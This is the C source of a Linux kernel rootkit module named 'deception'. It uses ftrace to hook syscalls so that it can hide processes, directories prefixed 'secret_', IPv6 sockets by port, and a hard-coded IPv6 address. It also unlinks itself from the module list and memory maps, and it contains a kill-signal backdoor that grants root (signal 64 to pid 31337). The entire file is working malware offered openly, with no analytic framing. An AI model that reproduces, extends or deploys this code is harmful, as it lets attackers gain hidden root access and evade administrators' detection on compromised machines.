#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/tcp.h>
#include <linux/seq_file.h>
#include <linux/limits.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/vmalloc.h>
#include <linux/inet_diag.h>
#include <linux/netlink.h>
#include <linux/sock_diag.h>
#include <linux/kmod.h>
#include <linux/inet.h> // in6_pton
#include <net/sock.h>
#include <net/inet_sock.h>
#include <net/ipv6.h>

#include "ftrace_helper.h"

static struct in6_addr target_ip6;
#define IP6_ADDRESS_TO_HIDE "2601:603:a7c:71c0:baba:19db:8655:2938"
#define MOD_REVEAL 8000
#define GET_ROOT 31337

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Collaborative Merge");
MODULE_DESCRIPTION("Integrated Rootkit: 61=Port, 62=PID, 63=Module, 64=Root");

/* --- Global Function Pointers --- */
static asmlinkage long (*orig_recvmsg)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *, void *);

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;

static struct list_head *my_vmap_area_list;
static spinlock_t *my_vmap_area_lock;
static struct rb_root *my_vmap_area_root;

static struct list_head *prev_module;
static struct kobject *kobj_parent;
static short hidden = 0;

/* --- Port Hiding Array Tracker --- */
#define MAX_HIDDEN_PORTS 32
static u16 hidden_ports[MAX_HIDDEN_PORTS] = {0};
static int hidden_ports_count = 0;

struct hidden_pid {
    char pid_str[NAME_MAX];
    struct list_head list;
};
static LIST_HEAD(hidden_pids_list);

/* --- Utility Functions --- */
static unsigned long lookup_name(const char *name) {
    struct kprobe kp = { .symbol_name = name };
    unsigned long addr;
    if (register_kprobe(&kp) < 0) return 0;
    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

static bool is_port_hidden(u16 port) {
    int i;
    for (i = 0; i < hidden_ports_count; i++) {
        if (hidden_ports[i] == port) return true;
    }
    return false;
}

void hideme_memory(void) {
    struct vmap_area *va, *tmp;
    unsigned long addr = (unsigned long)THIS_MODULE;
    if (!my_vmap_area_list || !my_vmap_area_lock) return;
    spin_lock(my_vmap_area_lock);
    list_for_each_entry_safe(va, tmp, my_vmap_area_list, list) {
        if (addr >= va->va_start && addr < va->va_end) {
            list_del(&va->list);
            if (my_vmap_area_root) rb_erase(&va->rb_node, my_vmap_area_root);
            break;
        }
    }
    spin_unlock(my_vmap_area_lock);
}

void hideme_full(void) {
    if (hidden) return;
    prev_module = THIS_MODULE->list.prev;
    kobj_parent = THIS_MODULE->mkobj.kobj.parent;
    list_del(&THIS_MODULE->list);
    THIS_MODULE->list.next = NULL;
    THIS_MODULE->list.prev = NULL;
    memset(THIS_MODULE->name, 0, MODULE_NAME_LEN);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    hideme_memory();
    hidden = 1;
}

void showme_full(void) {
    if (!hidden) return;
    strncpy(THIS_MODULE->name, "deception", MODULE_NAME_LEN);
    if (prev_module) list_add(&THIS_MODULE->list, prev_module);
    if (kobj_parent) kobject_add(&THIS_MODULE->mkobj.kobj, kobj_parent, "%s", THIS_MODULE->name);
    hidden = 0;
}

static struct hidden_pid* find_hidden_pid(const char *name) {
    struct hidden_pid *entry;
    list_for_each_entry(entry, &hidden_pids_list, list) {
        if (strcmp(entry->pid_str, name) == 0) return entry;
    }
    return NULL;
}

static int remove_hidden_pid(const char *name) {
    struct hidden_pid *entry, *tmp;
    list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
        if (strcmp(entry->pid_str, name) == 0) {
            list_del(&entry->list);
            kfree(entry);
            return 1;
        }
    }
    return 0;
}

static void clear_all_hidden_pids(void) {
    struct hidden_pid *entry, *tmp;
    list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
        list_del(&entry->list);
        kfree(entry);
    }
}

void set_root(void) {
    struct cred *root = prepare_creds();
    if (!root) return;
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    commit_creds(root);
}

/* --- Hook Implementations --- */
asmlinkage long hook_recvmsg(const struct pt_regs *regs) {
    struct msghdr __user *msg = (struct msghdr __user *)regs->si;
    struct user_msghdr umsg;
    struct iovec uiov;
    struct nlmsghdr *nlh;
    long ret = orig_recvmsg(regs);
    long offset = 0;
    void __user *iov_base;
    void *kbuf;

    if (ret <= 0 || hidden_ports_count == 0) return ret;
    if (copy_from_user(&umsg, msg, sizeof(umsg)) || copy_from_user(&uiov, umsg.msg_iov, sizeof(uiov)))
        return ret;

    iov_base = uiov.iov_base;
    if (!iov_base) return ret;

    kbuf = kvzalloc(ret, GFP_KERNEL);
    if (!kbuf || copy_from_user(kbuf, iov_base, ret)) {
        kvfree(kbuf);
        return ret;
    }

    while (offset + sizeof(struct nlmsghdr) <= ret) {
        nlh = (struct nlmsghdr *)(kbuf + offset);
        bool hide = false;
        if (nlh->nlmsg_len < sizeof(struct nlmsghdr)) break;

        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
            nlh->nlmsg_len >= sizeof(struct nlmsghdr) + sizeof(struct inet_diag_msg)) {

            struct inet_diag_msg *diag = (struct inet_diag_msg *)(nlh + 1);

            /* IPv6-only: hide only AF_INET6 sockets */
            if (diag->idiag_family == AF_INET6) {
                if (is_port_hidden(ntohs(diag->id.idiag_sport)) ||
                    is_port_hidden(ntohs(diag->id.idiag_dport))) {
                    hide = true;
                }
            }
        }

        if (hide) {
            long reclen = nlh->nlmsg_len;
            long tail = ret - (offset + reclen);
            if (tail > 0) memmove(kbuf + offset, kbuf + offset + reclen, tail);
            ret -= reclen;
        } else {
            offset += nlh->nlmsg_len;
        }
    }
    copy_to_user(iov_base, kbuf, ret);
    kvfree(kbuf);
    return ret;
}

asmlinkage int hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kdirent, *cur;
    int ret = orig_getdents64(regs);
    long bpos = 0;

    if (ret <= 0) return ret;
    kdirent = kvzalloc(ret, GFP_KERNEL);
    if (!kdirent || copy_from_user(kdirent, dirent, ret)) {
        kvfree(kdirent);
        return ret;
    }

    while (bpos < ret) {
        cur = (void *)kdirent + bpos;
        bool hide = false;
        if (cur->d_reclen == 0) break;

        if (!list_empty(&hidden_pids_list) && find_hidden_pid(cur->d_name)) hide = true;
        if (!hide && (cur->d_type == DT_DIR || cur->d_type == DT_UNKNOWN)) {
            if (strncmp(cur->d_name, "secret_", 7) == 0) hide = true;
        }

        if (hide) {
            long reclen = cur->d_reclen;
            long tail = ret - (bpos + reclen);
            if (tail > 0) memmove(cur, (void *)cur + reclen, tail);
            ret -= reclen;
        } else {
            bpos += cur->d_reclen;
        }
    }
    copy_to_user(dirent, kdirent, ret);
    kvfree(kdirent);
    return ret;
}

asmlinkage long hook_kill(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs_get_kernel_argument(regs, 0);
    int sig = (int)regs_get_kernel_argument(regs, 1);

    struct hidden_pid *pid_entry;
    char pid_str[NAME_MAX];
    int i;

    /* Signal 64: GET_ROOT */
    if (sig == 64 && pid == GET_ROOT) {
        set_root();
        return 0;
    }

    /* Signal 63: MOD_REVEAL */
    if (sig == 63 && pid == MOD_REVEAL) {
        if (hidden) showme_full(); else hideme_full();
        return 0;
    }

    /* Signal 62: Hide/Unhide Processes */
    if (sig == 62) {
        if (pid == 0) {
            clear_all_hidden_pids();
            return 0;
        }

        snprintf(pid_str, sizeof(pid_str), "%d", pid);

        if (remove_hidden_pid(pid_str)) {
            return 0;
        }

        pid_entry = kmalloc(sizeof(*pid_entry), GFP_KERNEL);
        if (pid_entry) {
            strscpy(pid_entry->pid_str, pid_str, sizeof(pid_entry->pid_str));
            list_add(&pid_entry->list, &hidden_pids_list);
        }
        return 0;
    }

    /* Signal 61: Hide/Unhide Network Ports */
    if (sig == 61) {
        u16 target_port = (u16)pid;
        if (target_port == 0) {
            hidden_ports_count = 0;
            return 0;
        }
        for (i = 0; i < hidden_ports_count; i++) {
            if (hidden_ports[i] == target_port) {
                int j;
                for (j = i; j < hidden_ports_count - 1; j++) {
                    hidden_ports[j] = hidden_ports[j + 1];
                }
                hidden_ports_count--;
                return 0;
            }
        }
        if (hidden_ports_count < MAX_HIDDEN_PORTS) {
            hidden_ports[hidden_ports_count++] = target_port;
        }
        return 0;
    }

    return orig_kill(regs);
}

/* --- IPv6 Network Seq Show Hook --- */

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    if (v != SEQ_START_TOKEN && v != NULL) {
        struct sock *sk = (struct sock *)v;

        if (sk->sk_family == AF_INET6) {
            /* Hide specific IPv6 address */
            if (ipv6_addr_equal(&sk->sk_v6_daddr, &target_ip6) ||
                ipv6_addr_equal(&sk->sk_v6_rcv_saddr, &target_ip6)) {
                return 0;
            }

            /* Hide ports for IPv6 sockets, using inet_sock/inet_timewait_sock */
            if (hidden_ports_count > 0) {
                if (sk->sk_state == TCP_TIME_WAIT) {
                    struct inet_timewait_sock *tw = (struct inet_timewait_sock *)v;
                    u16 sport = ntohs(tw->tw_sport);
                    u16 dport = ntohs(tw->tw_dport);

                    if (is_port_hidden(sport) || is_port_hidden(dport))
                        return 0;
                } else {
                    struct inet_sock *inet = inet_sk(sk);
                    u16 sport = ntohs(inet->inet_sport);
                    u16 dport = ntohs(inet->inet_dport);

                    if (is_port_hidden(sport) || is_port_hidden(dport))
                        return 0;
                }
            }
        }
    }

    return orig_tcp6_seq_show(seq, v);
}

/* --- FTrace Hook Definitions Configuration --- */
static struct ftrace_hook fh_hooks[] = {
    HOOK("__x64_sys_recvmsg",   hook_recvmsg,   &orig_recvmsg),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_kill",      hook_kill,      &orig_kill),
    HOOK("tcp6_seq_show",       hooked_tcp6_seq_show, &orig_tcp6_seq_show),
};

/* --- Module Initialization --- */
static int __init deception_init(void)
{
    int err;
    struct in6_addr tmp;   // <-- declare ONCE here

    my_vmap_area_list = (struct list_head *)lookup_name("vmap_area_list");
    my_vmap_area_lock = (spinlock_t *)lookup_name("vmap_area_lock");
    my_vmap_area_root = (struct rb_root *)lookup_name("vmap_area_root");

    /* Parse IPv6 address into tmp, then copy into target_ip6 */
    if (in6_pton(IP6_ADDRESS_TO_HIDE, -1, tmp.s6_addr, -1, NULL) != 1) {
        printk(KERN_ERR "deception: Failed to parse IPv6 address\n");
    } else {
        memcpy(&target_ip6, &tmp, sizeof(struct in6_addr));
    }

    err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
    if (err)
        return err;

    hideme_full();
    return 0;
}


/* --- Module Clean up --- */
static void __exit deception_exit(void)
{
    fh_remove_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
    clear_all_hidden_pids();
}

module_init(deception_init);
module_exit(deception_exit);
